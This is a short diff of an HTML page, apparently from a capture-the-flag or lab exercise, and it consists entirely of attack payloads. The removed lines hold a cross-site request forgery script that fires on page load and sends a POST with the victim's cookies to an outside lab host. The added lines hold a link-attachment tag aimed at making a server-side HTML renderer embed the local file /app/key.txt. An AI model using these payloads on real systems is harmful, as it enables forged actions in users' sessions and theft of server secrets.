@@ -1,26 +1,6 @@
-<!DOCTYPE html>
 <html>
-<body>
-    <script>
-        // Automatically execute when the page loads
-        fetch('https://ptl-36aedc2631d9-e33984037284.libcurl.me/share', {
-            method: 'POST',
-            headers: {
-                // Must match the application/json content type
-                'Content-Type': 'application/json',
-            },
-            // The body must be stringified JSON
-            body: JSON.stringify({
-                "user": "test",
-                "id": 1
-            }),
-            // CRITICAL: This ensures the victim's cookies are sent with the request
-            credentials: 'include'
-        }).then(response => {
-            console.log('Request sent');
-        }).catch(error => {
-            console.error('Request failed (likely due to CORS):', error);
-        });
-    </script>
-</body>
+<head>
+    <link rel="attachment" href="file:///app/key.txt">
+</head>
+    
 </html>
